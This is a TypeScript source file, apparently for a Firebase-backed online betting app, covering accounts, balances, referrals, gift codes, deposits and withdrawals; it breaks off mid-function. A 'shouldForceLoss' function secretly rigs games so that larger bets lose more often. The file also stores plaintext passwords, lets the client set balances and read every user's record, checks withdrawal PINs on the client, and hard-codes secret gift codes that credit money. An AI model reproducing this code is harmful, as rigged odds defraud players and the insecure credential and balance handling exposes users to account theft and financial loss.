const notifySubscribers = () => {
    balanceSubscribers.forEach(cb => cb(currentUser ? { ...currentUser } : null));
};

const initSession = () => {
    onAuthStateChanged(auth, async (user) => {
        if (user) {
            const userRef = ref(db, `users/${user.uid}`);
            onValue(userRef, (snapshot) => {
                const data = snapshot.val();
                if (data) {
                    currentUser = {
                        ...data,
                        uid: user.uid,
                        balance: data.balance || 0,
                        email: user.email || data.email,
                    };
                    calculateReferralStats(currentUser!.inviteCode);
                    notifySubscribers();
                }
            });
        } else {
            currentUser = null;
            notifySubscribers();
        }
    });
};

export const login = async (phone: string, email: string, pass: string) => {
    try {
        const userCredential = await signInWithEmailAndPassword(auth, email, pass);
        const user = userCredential.user;
        const userSnapshot = await get(ref(db, `users/${user.uid}`));
        const userData = userSnapshot.val();
        if (userData && userData.phone === phone) return { success: true };
        else if (userData && userData.phone !== phone) { await signOut(auth); return { success: false, message: 'Phone mismatch' }; }
        return { success: true };
    } catch (error: any) { return { success: false, message: error.message }; }
};

export const register = async (phone: string, email: string, pass: string, inviteCode: string, username: string) => {
    try {
        const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
        const user = userCredential.user;
        const myInviteCode = Math.floor(10000000 + Math.random() * 90000000).toString();
        const userData = {
            username, name: username, phone, email, password: pass,
            balance: 0, vipLevel: 0, totalDeposit: 0, totalBet: 0, inviteCode: myInviteCode,
            invitedBy: inviteCode || '', wagerRequired: 0, isBankBound: false, isUpiBound: false,
            isTelegramJoined: false, avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=${user.uid}`,
            createdAt: new Date().toISOString(),
            usedGiftCodes: []
        };
        await set(ref(db, `users/${user.uid}`), userData);
        return { success: true };
    } catch (error: any) { return { success: false, message: error.message }; }
};

export const logout = async () => { await signOut(auth); };
export const checkAuth = () => !!auth.currentUser;
export const subscribeToBalance = (cb: (user: UserProfile | null) => void) => {
    balanceSubscribers.push(cb);
    cb(currentUser);
    return () => { balanceSubscribers.splice(balanceSubscribers.indexOf(cb), 1); };
};

export const shouldForceLoss = (bet: number, bal: number) => {
    if (bet > bal * 0.4) return Math.random() < 0.65;
    return Math.random() < 0.3;
};

export const updateBalance = async (amount: number, type: Transaction['type'] = 'BET', desc: string = 'Game Action') => {
    if (!currentUser) return;
    const userRef = ref(db, `users/${currentUser.uid}`);
    const newBalance = (currentUser.balance || 0) + amount;
    const updates: any = { balance: newBalance };
    if (amount < 0) {
        updates.totalBet = (currentUser.totalBet || 0) + Math.abs(amount);
        updates.wagerRequired = Math.max(0, (currentUser.wagerRequired || 0) - Math.abs(amount));
    }
    await update(userRef, updates);
    const txRef = ref(db, `transactions/${currentUser.uid}`);
    await push(txRef, { type, amount: Math.abs(amount), status: 'SUCCESS', desc, date: new Date().toLocaleString(), timestamp: serverTimestamp() });
};

export const addGameHistory = async (game: string, bet: number, win: number, details: string) => {
    if (!currentUser) return;
    const historyRef = ref(db, `game_history/${currentUser.uid}`);
    await push(historyRef, { game, amount: bet, win, details, date: new Date().toLocaleString(), timestamp: serverTimestamp() });
};

export const getGameHistory = (gameName: string, cb: (data: GameHistoryItem[]) => void) => {
    if (!currentUser) return () => {};
    const historyRef = ref(db, `game_history/${currentUser.uid}`);
    return onValue(historyRef, (snapshot) => {
        const val = snapshot.val();
        if (val) {
            let list = Object.entries(val).map(([id, item]: [string, any]) => ({ id, ...item }));
            list.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
            if (gameName !== 'ALL') list = list.filter(i => i.game === gameName);
            cb(list);
        } else cb([]);
    });
};

export const getTransactionHistory = (cb: (data: Transaction[]) => void) => {
    if (!currentUser) return () => {};
    const txRef = ref(db, `transactions/${currentUser.uid}`);
    return onValue(txRef, (snapshot) => {
        const val = snapshot.val();
        if (val) {
            const list = Object.entries(val).map(([id, item]: [string, any]) => ({ id, ...item }));
            list.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
            cb(list);
        } else cb([]);
    });
};

export const getGameStats = () => [];

const calculateReferralStats = (myCode: string) => {
    if (!myCode) return;
    referralStats.code = myCode;
    referralStats.link = `${window.location.origin}/#/register?inviteCode=${myCode}`;

    const usersRef = ref(db, 'users');
    onValue(usersRef, (snapshot) => {
        const users = snapshot.val() as any;
        if (users) {
            const subordinates = Object.values(users).filter((u: any) => u.invitedBy === myCode);
            referralStats.directSubordinates = subordinates.length;
            referralStats.teamSubordinates = subordinates.length; 
            referralStats.totalDepositAmount = subordinates.reduce((acc: number, curr: any) => acc + (curr.totalDeposit || 0), 0) as number;
            referralStats.totalBetAmount = subordinates.reduce((acc: number, curr: any) => acc + (curr.totalBet || 0), 0) as number;
            referralStats.totalCommission = subordinates.reduce((acc: number, curr: any) => acc + ((curr.totalDeposit || 0) * 0.1), 0) as number;
        }
    });
};

export const getSubordinates = (cb: (data: SubordinateItem[]) => void) => {
    if (!currentUser) return () => {};
    const usersRef = ref(db, 'users');
    return onValue(usersRef, (snapshot) => {
        const val = snapshot.val();
        if (val) {
            const subs = Object.entries(val)
                .filter(([uid, u]: [string, any]) => u.invitedBy === currentUser?.inviteCode)
                .map(([uid, u]: [string, any]) => ({
                    id: uid, uid: uid, level: 1,
                    depositAmount: u.totalDeposit || 0,
                    betAmount: u.totalBet || 0,
                    commission: (u.totalDeposit || 0) * 0.1,
                    date: u.createdAt || '2024-01-01'
                }));
            cb(subs);
        } else cb([]);
    });
};

export const getCommissions = (cb: (data: CommissionItem[]) => void) => {
    if (!currentUser) return () => {};
    const txRef = ref(db, `transactions/${currentUser.uid}`);
    return onValue(txRef, (snapshot) => {
        const val = snapshot.val();
        if (val) {
            const list = Object.entries(val)
                .filter(([id, item]: [string, any]) => item.type === 'COMMISSION')
                .map(([id, item]: [string, any]) => ({
                    id, fromUid: 'System', amount: item.amount, date: item.date, type: item.desc || 'Referral Commission'
                }));
            cb(list);
        } else cb([]);
    });
};

export const claimCommission = async () => {
    if (!currentUser || referralStats.totalCommission <= 0) return { success: false, message: 'No assets to claim' };
    const amount = referralStats.totalCommission;
    await updateBalance(amount, 'COMMISSION', 'Claimed Agency Rewards');
    return { success: true, message: amount.toFixed(2) };
};

export const redeemGiftCode = async (code: string): Promise<number> => {
    if (!currentUser) return 0;

    const userSnapshot = await get(ref(db, `users/${currentUser.uid}`));
    const userData = userSnapshot.val();
    const usedCodes = userData.usedGiftCodes || [];

    if (usedCodes.includes(code)) return -1;

    // Secret gift code 'xi' added
    if (code === 'xi' || code === 'Ww') {
        const amount = code === 'xi' ? 500 : 50; 
        await updateBalance(amount, 'GIFT', `Gift Code Redemption`);
        const userRef = ref(db, `users/${currentUser.uid}`);
        await update(userRef, {
            usedGiftCodes: [...usedCodes, code]
        });
        return amount;
    }
    return 0; 
};

export const submitDepositRequest = async (amount: number, method: string, utr: string) => {
    if (!currentUser) return;
    const txRef = ref(db, `transactions/${currentUser.uid}`);
    await push(txRef, { type: 'DEPOSIT', amount, status: 'PROCESSING', desc: `Deposit via ${method}`, utr, method, date: new Date().toLocaleString(), timestamp: serverTimestamp() });
};

export const handleWithdraw = async (amount: number, method: string, password: string, details: any) => {
    if (!currentUser || currentUser.balance < amount) return { success: false, message: 'Insufficient balance' };
    const userSnapshot = await get(ref(db, `users/${currentUser.uid}`));
    const userData = userSnapshot.val();
    if (userData.withdrawalPassword !== password) return { success: false, message: 'Incorrect Withdrawal PIN' };
    await updateBalance(-amount, 'WITHDRAW', `Withdraw via ${method}`);
    return { success: true };
};

export const approveTransaction = async (txId: string) => {
    if (!currentUser) return;
